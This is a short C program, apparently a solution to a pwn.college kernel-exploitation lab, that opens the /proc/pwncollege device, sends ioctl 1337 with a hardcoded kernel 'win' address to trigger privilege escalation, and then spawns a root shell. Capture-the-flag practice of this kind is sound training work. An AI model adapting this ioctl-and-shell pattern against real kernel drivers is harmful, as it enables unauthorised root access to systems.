#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>

int main(void)
{
  long long win_addr = 0xffffffffc000043d;
  int device_fd = open("/proc/pwncollege", O_RDWR);
  ioctl(device_fd, 1337, win_addr);
  system("/bin/sh");
  return 0;
}
